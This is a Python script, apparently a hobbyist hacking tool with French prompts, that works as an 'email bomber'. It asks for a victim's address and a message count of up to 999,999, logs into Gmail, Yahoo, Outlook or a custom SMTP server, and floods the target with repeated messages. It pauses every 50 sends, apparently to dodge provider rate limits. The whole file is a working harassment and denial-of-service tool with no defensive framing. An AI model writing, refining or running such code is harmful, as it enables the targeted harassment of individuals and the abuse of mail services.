import smtplib
import sys
import time


class bColors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'


def banner():
    print(bColors.BLUE + '<<< Erasmus Bomber >>>')
    print(bColors.YELLOW + r'''



 ▄███▄   █▄▄▄▄ ██      ▄▄▄▄▄   █▀▄▀█   ▄      ▄▄▄▄▄       ███   ████▄ █▀▄▀█ ███   ▄███▄   █▄▄▄▄
█▀   ▀  █  ▄▀ █ █    █     ▀▄ █ █ █    █    █     ▀▄     █  █  █   █ █ █ █ █  █  █▀   ▀  █  ▄▀
██▄▄    █▀▀▌  █▄▄█ ▄  ▀▀▀▀▄   █ ▄ █ █   █ ▄  ▀▀▀▀▄       █ ▀ ▄ █   █ █ ▄ █ █ ▀ ▄ ██▄▄    █▀▀▌
█▄   ▄▀ █  █  █  █  ▀▄▄▄▄▀    █   █ █   █  ▀▄▄▄▄▀        █  ▄▀ ▀████ █   █ █  ▄▀ █▄   ▄▀ █  █
▀███▀     █      █               █  █▄ ▄█                ███            █  ███   ▀███▀     █
         ▀      █               ▀    ▀▀▀                               ▀                  ▀
               ▀

               by Dechiranus - LE FLEUVE/World Of Chrack
     ''')


class EmailBomber:
    count = 0

    def __init__(self):
        self.countFactor = None
        self.amount = None
        self.port = None
        self.server = None
        self.fromAddr = None
        self.fromPwd = None
        self.subject = None
        self.message = None
        self.msg = None
        self.s = None
        self.r = bColors.RED
        self.g = bColors.GREEN
        self.b = bColors.BLUE
        self.y = bColors.YELLOW
        try:
            print(self.b + '\n[+] INITIALISATION DE LA BOMBE ...')
            self.target = str(input(self.g + '[:] EMAIL DE LA VICTIME > '))
            self.mode = int(input(self.g + '[:] BOMBE MODE (1,2,3,4,5,6) || 1:(10) 2:(50) 3:(250) 4:(666) 5:(999999) 6:(custom) > '))

            if int(self.mode) > int(6) or int(self.mode) < int(1):
                print(self.r + '[-] ERREUR: OPTION INVALIDE BIATCH !')
                sys.exit(0)

        except Exception as e:
            print(self.r + f'\n[-] ERREUR: {e}')
            sys.exit(0)

    def bomb(self):
        try:
            print(self.b + '\n[+] CONFIGURATION DE LA BOMBE ...')

            if self.mode == int(1):
                self.amount = int(10)
            elif self.mode == int(2):
                self.amount = int(50)
            elif self.mode == int(3):
                self.amount = int(250)
            elif self.mode == int(4):
                self.amount = int(666)
            elif self.mode == int(5):
                self.amount = int(999999)
            else:
                self.amount = int(input(self.g + '[:] CHOISIS LA VALEUR CUSTOM (exemple: 666, 9821) > '))
            print(self.g + f'[+] VOus avez selectionnez le mode {self.mode} et {self.amount} emails')

        except Exception as e:
            print(self.r + f'\n[-] ERREUR: {e}')
            sys.exit(0)

    def email(self):
        try:
            print(self.b + '\n[+] CONFIGURATION DU SERVICE ...')
            self.server = str(input(self.g + '[:] 1:Gmail 2:Yahoo' '3:Outlook 4:Custom > '))
            defaultPort = True

            if self.server == '4':
                defaultPort = False
                self.port = int(input(self.g + '[:] PORT > '))

            if defaultPort:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(self.g + '[:] Email de l\'attaquant > '))
            self.fromPwd = str(input(self.g + '[:] Mot de passe de l\'email attaquant > '))
            self.subject = str(input(self.g + '[:] SUjet de l\'email > '))
            self.message = str(input(self.g + '[:] Message de l\'email > '))

            if self.target == self.fromAddr:
                print(self.r + '\n[-] ERREUR: TU PEUX PAS T\'AUTO ATTAQUER, C\'EST STUPIDE SINON !')

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                        ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(self.r + f'\n[-] ERREUR: {e}')
            sys.exit(0)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.message)
            self.count += 1
            loadSeq = float(self.count) * self.countFactor
            sys.stdout.write(self.y + '\r' + '[BOMBE EXPLOSEE:' + self.b + f' {self.count}' + self.y + ']' + self.b +
                             ' [' + self.g + ('#' * int(loadSeq)) + self.b + ']')
            sys.stdout.flush()
            if self.count % 50 == 0 and self.count != self.amount:
                time.sleep(0.5)
                sys.stdout.flush()
                waitLimit = 60
                while waitLimit > 0:
                    sys.stdout.write(self.r + '\r' + f'[↻] EMAIL ENVOYEE {self.count} ... RESET DE LA BOMBE WLH !! => ' +
                                     self.y + ' ATTENTE: ' + str(waitLimit) + ' secondes')
                    time.sleep(1)
                    waitLimit -= 1
                    sys.stdout.flush()

        except Exception as e:
            print(self.r + f'\n[-] ERREUR: {e}')
            sys.exit(0)

    def attack(self):
        print(self.b + '\n[+] ATTAQUE ...')
        print(self.y + '\r' + '[' + self.r + '☠' + self.y + '] BOMBING emails')
        self.countFactor = float(100 / self.amount)
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(self.g + '\n[+] ATTAQUE FINIS !')
        print(self.g + f'[+] BIEN ENVOYEE {self.amount} emails !!')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = EmailBomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
